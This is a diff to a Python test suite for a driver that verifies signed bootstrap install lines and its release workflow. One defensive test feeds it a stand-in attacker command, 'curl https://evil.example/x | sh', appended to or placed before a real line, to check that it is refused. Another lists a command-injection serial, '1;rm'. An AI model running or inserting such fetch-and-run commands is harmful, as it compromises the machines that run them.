@@ -11,8 +11,10 @@ import os
 import re
 import shutil
 import socket
+import subprocess
 import sys
 import tempfile
+import textwrap
 import unittest
 import unittest.mock as mock
 from pathlib import Path
@@ -452,7 +454,8 @@ class RealMode(unittest.TestCase):
         self.publish()
         patches = (mock.patch.dict(os.environ, {'FAKE_REL': str(self.rel), 'FAKE_TAG': f'install-{self.SERIAL}'}),
                    mock.patch.object(sd.platform, 'system', return_value='Darwin'), mock.patch.object(sd, 'machine', return_value=None),
-                   mock.patch.object(sd, 'watch_roots', return_value=[str(self.outside)]))
+                   mock.patch.object(sd, 'watch_roots', return_value=[str(self.outside)]),
+                   mock.patch.object(sd, 'expected_line', side_effect=lambda *a: self.shown))   # the fake line is its own template here
         for p in patches:
             p.start()
             self.addCleanup(p.stop)
@@ -472,6 +475,7 @@ class RealMode(unittest.TestCase):
 
     def publish(self, line=None, key=None, notes_sha=None, asset=None, drop_os=None, notes=None):
         sha = notes_sha or self.sha
+        self.shown = line or self.good_line()
         blocks = ''.join(f'\n{o} (bootstrap sha256 {sha}):\n```\n{line or self.good_line()}\n```' for o in ('win', 'mac', 'ubuntu') if o != drop_os)
         (self.rel / 'notes.md').write_text(notes if notes is not None else
                                            f'Signed install set install-{self.SERIAL}. Verify it.\nkey {key or self.KEY}\nserial {self.SERIAL}, valid_until T\n{blocks}')
@@ -612,6 +616,26 @@ class RealMode(unittest.TestCase):
         self.assertEqual(self.real()[0], 0)
         self.assertTrue((self.t / 'home-ok').exists())
 
+    def test_every_temp_and_home_variable_the_line_sees_is_the_throwaway_one(self):
+        """TMPDIR is what mktemp -d reads on the Mac and Ubuntu lines, TEMP what the Windows line reads: each is recorded by the line,
+        under a real TMPDIR the driver must replace, and compared by realpath (a trailing slash is not a different folder)."""
+        real_tmp = self.t / 'real-tmp'
+        real_tmp.mkdir()
+        got = self.t / 'vars'
+        self.publish(line=self.good_line(f'printf "%s\\n" "$HOME" "$TMPDIR" "$TMP" "$TEMP" > {got}'))
+        with mock.patch.dict(os.environ, {'TMPDIR': str(real_tmp) + '/', 'TMP': str(real_tmp), 'TEMP': str(real_tmp)}):
+            self.assertEqual(self.real()[0], 0)
+        home, *temps = got.read_text().splitlines()
+        real = lambda p: os.path.realpath(p)   # noqa: E731
+        self.assertNotEqual(real(home), real(os.path.expanduser('~')))
+        for name, v in zip(('TMPDIR', 'TMP', 'TEMP'), temps):
+            with self.subTest(name):
+                self.assertNotEqual(real(v), real(real_tmp))
+                self.assertNotEqual(real(v), real(tempfile.gettempdir()))
+                self.assertEqual(os.path.basename(v), 'tmp')   # the driver's own folder, a sibling of the throwaway home
+                self.assertEqual(os.path.dirname(v), os.path.dirname(home))
+        self.assertEqual(len(set(temps)), 1)
+
     def test_a_temp_folder_left_behind_fails(self):
         self.fails(self.good_line('mkdir "$TMPDIR/fleet-boot.left"'), 'temp folder left')
 
@@ -629,6 +653,8 @@ class RealMode(unittest.TestCase):
     def test_a_missing_serial_line_or_code_line_or_a_non_zero_exit_fails(self):
         base = [f'bootstrap sha256 {self.sha}', f'key {self.KEY}', f'serial {self.SERIAL} valid_until T', self.CODE]
         self.fails(self.good_line(out=base[:2] + [self.CODE]), 'info lines')
+        self.fails(self.good_line(out=[*base[:2], 'serial 9 valid_until T', self.CODE]), 'info lines')   # another serial's document is not this release
+        self.fails(self.good_line(out=[*base[:2], 'serial 77 valid_until T', self.CODE]), 'info lines')
         self.fails(self.good_line(out=base[:3]), 'no `Your code:` line')
         self.fails(self.good_line('exit 3'), 'exit 3, want 0')
 
@@ -639,6 +665,23 @@ class RealMode(unittest.TestCase):
             self.assertEqual(self.real()[0], 0)
             self.assertEqual(self.real('--must-run')[0], 1)  # a vacuous pass: this runner must reach the check
         self.fails(self.good_line('exit 1', out=refused), 'info lines')  # a machine that is not refused must not print it
+
+    def test_a_machine_that_refuses_must_print_no_info_line(self):
+        info = [f'bootstrap sha256 {self.sha}', f'key {self.KEY}', f'serial {self.SERIAL} valid_until T']
+        self.publish(line=self.good_line('exit 1', out=[*info, 'REFUSED os', 'This machine is not supported.']))
+        with mock.patch.object(sd, 'machine', return_value='os'):
+            rc, out = self.real()
+        self.assertEqual(rc, 1, out)
+        self.assertIn('info lines', out)
+        self.assertIn('want none', out)
+
+    def test_a_line_that_does_not_finish_fails(self):
+        self.publish(line=self.good_line('exec sleep 30'))
+        with mock.patch.object(sd, 'RUN_TIMEOUT', 0.5):
+            rc, out = self.real()
+        self.assertEqual(rc, 1, out)
+        self.assertIn('did not finish in 0.5 s', out)
+        self.assertIn('FAIL real install-', out)
 
     def test_the_serial_is_digits_only(self):
         for bad in ('', '007', '-1', '1;rm', '1 2', '99999999999', '٣'):
@@ -666,10 +709,28 @@ class RealMode(unittest.TestCase):
         pub = publisher()
         for os_name, kind in sd.OS_BOOT.items():
             line = pub.check_line(os_name, 'org/repo', self.SERIAL, self.sha, self.MIN)
-            self.assertEqual(sd.check_shape(line, 'org/repo', self.SERIAL, kind, self.sha, self.MIN), self.MIN, os_name)
+            self.assertEqual(sd.check_shape(line, 'org/repo', self.SERIAL, kind, self.sha, self.MIN), self.MIN, os_name)   # shape only
             with self.assertRaises(sd.Refused):
                 sd.check_shape(line, 'org/repo', self.SERIAL, kind, 'f' * 64, None)
         self.assertEqual(sd.OS_BOOT, pub.OS_BOOT)
+
+    def test_a_line_must_equal_the_publishers_text_so_an_appended_payload_is_never_run(self):
+        pub = publisher()
+        with mock.patch.object(sd, 'expected_line', side_effect=lambda *a: pub.check_line(*a)):   # main's real renders, not the fake line
+            for os_name, kind in sd.OS_BOOT.items():
+                line = pub.check_line(os_name, 'org/repo', self.SERIAL, self.sha, self.MIN)
+                self.assertEqual(sd.check_shape(line, 'org/repo', self.SERIAL, kind, self.sha, self.MIN, os_name), self.MIN, os_name)
+                for why, bad in {'appended statement': f"{line}; curl https://evil.example/x | sh",
+                                 'digest only in an echo': f"echo 'https://github.com/org/repo/releases/download/install-{self.SERIAL}/bootstrap.{kind}' {self.sha} --serial {self.SERIAL} --min-serial {self.MIN} -Serial {self.SERIAL} -MinSerial {self.MIN}; curl https://evil.example/x | sh",
+                                 'a prefix': f'curl https://evil.example/x | sh; {line}',
+                                 'a lower min serial': line.replace(f'--min-serial {self.MIN}', '--min-serial 0').replace(f'-MinSerial {self.MIN}', '-MinSerial 0')}.items():
+                    with self.subTest(os_name=os_name, why=why):
+                        with self.assertRaises(sd.Refused) as e:
+                            sd.check_shape(bad, 'org/repo', self.SERIAL, kind, self.sha, self.MIN, os_name)
+                        self.assertEqual(e.exception.code, 'line')
+            # and end to end: the release's notes carry the payload line, the run refuses before anything runs
+            self.publish(line=pub.check_line('mac', 'org/repo', self.SERIAL, self.sha, self.MIN) + f'; echo > {self.sentinel()}')
+            self.refused('line')
 
     def test_the_publishers_release_notes_parse(self):
         pub = publisher()
@@ -720,16 +781,47 @@ class RealWorkflow(unittest.TestCase):
         for m in re.finditer(r'(?ms)^\s*(?:- )?run:(.*?)(?=^\s*(?:- )?\w[\w-]*:|\Z)', REAL_WF):
             self.assertNotIn('${{', m[1])
 
+    ROW = r'(?m)^          - runner: ([\w.-]+)(?: +#.*)?\n            os: (\w+)\n(?:            trust: [\w-]+\n)?            must_run: (true|false)\n'
+
     def test_the_runners_are_the_gates_and_it_runs_only_from_main_over_main(self):
         legs = lambda t: re.findall(r'(?m)^          - runner: (\S+)', t)   # noqa: E731
         self.assertEqual(legs(REAL_WF), legs(SMOKE))
-        self.assertIn("    if: github.ref == 'refs/heads/main'\n", REAL_WF)
         self.assertIn('          ref: main\n', REAL_WF)
         self.assertIn('python tests/fixture/smoke_driver.py real --serial "$SERIAL" --os "$BOOT_OS" --repo "$REPO" "${flag[@]}"', REAL_WF)
         self.assertIn('[[ $SERIAL =~ $re ]]', REAL_WF)
         self.assertIn("re='^(0|[1-9][0-9]{0,9})$'", REAL_WF)
         self.assertIn('${{ inputs.serial }}', REAL_WF)
         self.assertNotIn('inputs.serial', re.sub(r'(?m)^          SERIAL: .*$', '', REAL_WF))   # the input reaches the script through env only
+
+    def test_each_leg_is_as_strict_as_the_release_gates_leg(self):  # a must_run: false on a real leg would pass it vacuously on a machine refusal
+        mine, gate = re.findall(self.ROW, REAL_WF), re.findall(self.ROW, SMOKE)
+        self.assertEqual(len(gate), 5)
+        self.assertEqual([(r, m) for r, _, m in mine], [(r, m) for r, _, m in gate])
+        self.assertEqual(REAL_WF.count('          - runner:'), len(mine))   # no row in another shape
+        self.assertEqual([r for r, _, m in mine if m == 'false'], ['ubuntu-22.04'])
+
+    def test_a_dispatch_from_another_branch_fails_and_never_skips_green(self):
+        self.assertNotRegex(REAL_WF, r'(?m)^\s+if: ')   # a skipped job shows green with no case run
+        guard = re.search(r'(?ms)^  guard:[^\n]*\n(.*?)(?=^  \w[\w-]*:\n|\Z)', REAL_WF)[1]
+        self.assertIn('runs-on: ubuntu-24.04\n', guard)   # never a macOS or Windows minute just to say no
+        self.assertIn('REF: ${{ github.ref }}\n', guard)
+        self.assertIn('[ "$REF" = refs/heads/main ] || {', guard)
+        self.assertIn('exit 1;', guard)
+        self.assertNotIn('${{', re.search(r'(?ms)run: \|\n(.*)', guard)[1])
+        self.assertIn('    needs: guard\n', REAL_WF)
+        bash = shutil.which('bash')
+        if bash:
+            script = re.search(r'(?ms)run: \|\n(.*)', guard)[1]
+            for ref, rc in (('refs/heads/main', 0), ('refs/heads/other', 1), ('refs/pull/1/merge', 1), ('', 1)):
+                with self.subTest(ref=ref):
+                    done = subprocess.run([bash, '--noprofile', '--norc', '-e', '-o', 'pipefail', '-c', textwrap.dedent(script)], env={'REF': ref, 'PATH': os.environ['PATH']},
+                                          capture_output=True, text=True, timeout=30)
+                    self.assertEqual(done.returncode, rc, done.stdout)
+
+    def test_the_drivers_timeout_fires_before_the_jobs(self):  # GitHub's kill leaves no judged output; the driver's must come first
+        minutes = [int(m) for m in re.findall(r'(?m)^    timeout-minutes: (\d+)$', REAL_WF)]
+        job = max(minutes)
+        self.assertGreaterEqual(job * 60 - sd.RUN_TIMEOUT, 300)   # the checkout, python, the plan and the download come before the line
 
     def test_the_real_workflow_names_what_it_costs(self):
         self.assertIn('hosted-runner minutes', REAL_WF)
